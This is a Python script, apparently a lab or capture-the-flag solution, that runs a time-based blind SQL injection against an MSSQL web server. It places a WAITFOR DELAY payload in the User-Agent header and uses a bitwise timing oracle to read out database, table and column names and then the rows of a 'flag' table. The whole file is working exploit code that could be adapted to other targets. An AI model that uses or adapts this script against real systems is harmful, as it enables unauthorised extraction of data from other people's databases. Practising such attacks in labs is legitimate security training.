#!/usr/bin/python3

import requests
import time
import sys

# Define the length of time (in seconds) the server should wait if `q` is `true`
DELAY = 1

# Proxy settings
proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# Evaluates `q` on the server side and returns `true` or `false`
def oracle(q):
    start = time.time()
    r = requests.get(
        "http://10.129.204.197:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"},
        proxies=proxy
    )
    return time.time() - start > DELAY

# Dump a number
def dumpNumber(q):
    length = 0
    for p in range(7):
        if oracle(f"({q})&{2**p}>0"):
            length |= 2**p
    return length

# db_name_length = dumpNumber("LEN(DB_NAME())")
# print(f"[*] DB name length = {db_name_length}")

# Dump a string
def dumpString(q, length):
    val = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val

# db_name = dumpString("DB_NAME()", db_name_length)
# print(f"[*] DB name = {db_name}")


# # Dump the num of table
# num_tables = dumpNumber(f"SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='{db_name}'")
# print(f"[+] Num of tables = {num_tables}")


# # Dump the name o tables
# for i in range(num_tables):
#     table_name_length = dumpNumber(f"select LEN(table_name) from information_schema.tables where table_catalog='digcraft' order by table_name offset {i} rows fetch next 1 rows only")
#     print(f"[+] Table {i} name length = {table_name_length}")
#     table_name = dumpString(f"select table_name from information_schema.tables where table_catalog='digcraft' order by table_name offset {i} rows fetch next 1 rows only", table_name_length)
#     print(f"[+] Table {i} name = {table_name}")


# # Get the number of columns in the 'flag' table
# num_columns = dumpNumber("select count(column_name) from INFORMATION_SCHEMA.columns where table_name='flag' and table_catalog='digcraft'")
# print(f"[-] Num of columns = {num_columns}")


# # Dump the name of columns
# for i in range(num_columns):
#     column_name_length = dumpNumber(f"select LEN(column_name) from INFORMATION_SCHEMA.columns where table_name='flag' and table_catalog='digcraft' order by column_name offset {i} rows fetch next 1 rows only")
#     print(f"[-] Column {i} name length = {column_name_length}")
#     column_name = dumpString(f"select column_name from INFORMATION_SCHEMA.columns where table_name='flag' and table_catalog='digcraft' order by column_name offset {i} rows fetch next 1 rows only", column_name_length)
#     print(f"[-] Column {i} name = {column_name}")
    

# Get the number of rows in the 'flag' column
num_rows = dumpNumber("SELECT COUNT(flag) FROM digcraft.dbo.flag")
print(f"[-] Num of rows = {num_rows}")


# Dump the value of the row
for i in range(num_rows):
    row_value_length = dumpNumber(f"SELECT LEN(flag) FROM digcraft.dbo.flag ORDER BY flag OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY")
    print(f"[-] Row {i} value length = {row_value_length}")
    row_value = dumpString(f"SELECT flag FROM digcraft.dbo.flag ORDER BY flag OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY", row_value_length)
    print(f"[+] Row {i} value = {row_value}")
    
